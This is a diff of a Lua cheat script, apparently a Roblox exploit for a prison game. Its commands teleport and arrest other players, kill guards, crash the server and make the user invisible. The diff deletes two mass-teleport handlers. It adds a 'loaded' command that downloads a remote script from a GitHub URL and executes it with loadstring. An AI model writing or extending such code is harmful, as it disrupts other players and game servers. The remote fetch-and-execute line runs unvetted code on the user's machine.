@@ -419,7 +419,6 @@ Cmd[#Cmd + 1] =		{Text = "lakesidegrocer / lake",Title = "Teleport you in lakesi
 Cmd[#Cmd + 1] =		{Text = "lakesidegrocer /  lake [plr]",Title = "Bring player teleport you in lakeside grocer"}
 Cmd[#Cmd + 1] =		{Text = "roof [plr]",Title = "Bring player teleport you in roof"}
 Cmd[#Cmd + 1] =		{Text = "gatetower [plr]",Title = "Bring player teleport you in gatetower"}
-Cmd[#Cmd + 1] =		{Text = "makecrimall",Title = "Make all players become a criminals"}
 Cmd[#Cmd + 1] =		{Text = "loopbring [plr]",Title = "Loop bring player"}
 Cmd[#Cmd + 1] =		{Text = "unloopbring ",Title = "Unloop bring player"}
 Cmd[#Cmd + 1] =		{Text = "baseballbat / bat",Title = "Gets bat"}
@@ -459,8 +458,9 @@ Cmd[#Cmd + 1] =		{Text = "unantifell / unantivoid",Title = "Unactivate anti fell
 Cmd[#Cmd + 1] =		{Text = "clickarrest / click",Title = "Click arrest any players"}
 Cmd[#Cmd + 1] =		{Text = "crashserver / crash / server",Title = "It will make server crash"}
 Cmd[#Cmd + 1] =		{Text = "fullbright  / bright  / fullbrightness / brightness",Title = "It makes full brightness in the game"}
-Cmd[#Cmd + 1] =		{Text = "flycar / car",Title = "Activate fly car"}
+Cmd[#Cmd + 1] =		{Text = "flycar",Title = "Activate fly car"}
 Cmd[#Cmd + 1] =		{Text = "invisible / invis",Title = "Make your character become invisible"}
+Cmd[#Cmd + 1] =		{Text = "loaded",Title = "Loaded FE Slasher"}
 
 
 
@@ -1351,7 +1351,6 @@ local Walls = {
 	game.Workspace.Prison_Cellblock.b_ceiling,
 	game.Workspace.City_buildings,
 	game.Workspace.Prison_OuterWall,
-	game.Workspace.Prison_Fences,
 	game.Workspace.Prison_Guard_Outpost,
 	game.Workspace.Prison_Cafeteria.building,
 	game.Workspace.Prison_Cafeteria.glass,
@@ -1410,8 +1409,12 @@ function PlayerChatted(Message)
 			Notify("No arguaments found", Color3.fromRGB(255, 0, 0), "Error")
 		end
 	end
+
+	if Command("loaded") then
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/RealErickDenisDavid/Loaded-FE-Slasher/main/FE%20Slasher.lua", true))()
+	end
 	
-	if Command("flycar") or Command("car") then
+	if Command("flycar") then
 		local hint = Instance.new("Hint",game.Players.LocalPlayer.PlayerGui)
 		hint.Text = "Press X To Toggle"
 		hint.Name = game.JobId
@@ -2508,7 +2511,6 @@ function PlayerChatted(Message)
 		end
 	end
 
-
 	if Command("secret") then
 		local Player = GetPlayer(Arg2)
 		if Player ~= nil then
@@ -2547,7 +2549,6 @@ function PlayerChatted(Message)
 
 	if Command("rejoin") then
 		Notify("Rejoining server", Color3.fromRGB(0, 255, 0), "Success")
-		wait(.1)
 		game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
 	end
 	
@@ -2808,7 +2809,6 @@ function PlayerChatted(Message)
 		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(474.3, 11.4254, 1171)
 	end
 
-
 	if Command("crimbase") or Command("criminalbase") then
 		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-943, 95, 2055)
 	end
@@ -2872,48 +2872,7 @@ function PlayerChatted(Message)
 			end
 		end
 	end
-	
-	if Command("makecrimall") then
-		local savedcf = GetOrientation()
-		local CrimPad = workspace["Criminals Spawn"].SpawnLocation
-		local padcf = CrimPad.CFrame
-		workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Really red").Name)
-		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CrimPad.CFrame
-		wait()
-		CrimPad.CFrame = GetPos()
-		CrimPad.CanCollide = false
-		CrimPad.Transparency = 1.000
-		CrimPad.Anchored = true
-		repeat wait() 
-			pcall(function()
-				for i,v in pairs(game.Teams.Inmates:GetPlayers()) do
-					if v ~= game.Players.LocalPlayer then
-						Teleport(v, CrimPad.CFrame)
-					end
-				end
-				for i,v in pairs(game.Teams.Guards:GetPlayers()) do
-					if v ~= game.Players.LocalPlayer then
-						Teleport(v, CrimPad.CFrame)
-					end
-				end
-			end)
-		until #game.Teams.Criminals:GetPlayers() == (#game.Players:GetPlayers()-#game.Teams.Neutral:GetPlayers())
-		workspace.Remote.loadchar:InvokeServer()
-		CrimPad.Transparency = 0.000
-		CrimPad.CFrame = padcf
-		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
-		Notify("Make everyone crimmed", Color3.fromRGB(0, 255, 0), "Success")
-	end
-	if Command("bringall") then
-		for i,v in pairs(game.Players:GetPlayers()) do
-			if v ~= game.Players.LocalPlayer then
-				Teleport(v, GetPos())
-			end
-		end
-		
-		Notify("Broght all", Color3.fromRGB(0, 255, 0), "Success")
-	end
-	
+
 	if Command("notify") then
 		States.Notify = true
 		Notify("Notify on", Color3.fromRGB(0, 255, 0), "Success")
@@ -2923,12 +2882,7 @@ function PlayerChatted(Message)
 		States.Notify = false
 		Notify("Notify off", Color3.fromRGB(0, 255, 0), "Success")
 	end
-	
-	if PrefixCommand("getprefix") then
-		Chat("Prefix : "..Prefix)
-		Notify("Prefix : "..Prefix, Color3.fromRGB(0, 255, 0), "Success")
-	end
-	
+
 	if Command("cmd") or Command("cmds") then
 		if Background.Visible == true then
 			Background.Visible = false
@@ -2997,6 +2951,8 @@ function AdminPlayerChatted(Message, Player)
 	if Command("hallway") then
 		Teleport(Player, CFrame.new(860.78448486328, 99.990005493164, 2362.9597167969))	
 	end 
+
+	
 	
 	if Command("killguard") or Command("killguards") then
 		wait(.075)
